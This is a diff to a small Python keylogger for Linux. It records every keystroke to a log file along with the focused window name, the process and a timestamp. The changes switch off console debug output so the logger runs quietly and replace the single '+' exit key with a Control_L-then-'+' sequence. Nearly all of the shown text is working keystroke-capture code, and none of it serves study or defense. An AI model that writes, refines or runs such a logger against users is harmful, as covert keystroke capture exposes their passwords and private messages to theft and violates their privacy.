@@ -6,9 +6,7 @@ All rights reserved.
 A simple keylogger witten in python for linux platform
 All keystrokes are recorded in a log file.
 
-The program terminates when plus key(+) is pressed
-
-Modified by Mirko Conti.
+The program terminates when CTRL_l and the plus key(+) are pressed
 
 """
 
@@ -17,12 +15,18 @@ from time import gmtime, strftime
 
 #change this to your log file's path
 log_file='file.log'
+
 #name of the current focused window
 current_window=""
 #var of the open file
 of=""
 #debug boolean, to print in the console too
-debug=True
+debug=False
+
+previous_code= ""
+# shutdown key
+shutdown_key = 43 # ctrl_l and '+' to exit
+
 
 def printOnFile(string):
 	global of
@@ -41,23 +45,27 @@ def getDate():
 #when a button is pressed 
 def OnKeyPressConsol(event): 
 	global current_window
+	global previous_code
 	key = ""
 	if event.Ascii==0:
-		key=" %s" % event.Key
+		key="%s" % event.Key
 	else:
-		key=" %s" % event.Key
-	
+		key="%s" % event.Key
 	if current_window==event.WindowName:
-		printOnFile(key)
+		printOnFile(" " + key)
 		printOnConsole(key)
 	else:
 		current_window = event.WindowName
 		log = "\n\n" + "-"*75 + "\n# " + getDate() + event.WindowName + " [ " + event.WindowProcName + " ]" + "\n" + "-"*75 + "\n" + key 
 		printOnFile(log)
 		printOnConsole(log)
-	if event.Ascii==43: #43 +
+	if previous_code == "Control_L" and event.Ascii == shutdown_key:   # 'Control_L'  then key to exit
+		printOnFile("\nProgram close")
 		of.close()
-		new_hook.cancel()    
+		new_hook.cancel()    	
+	# set previous code
+	previous_code = key
+
 	    
 #main function	  
 if __name__ == '__main__':
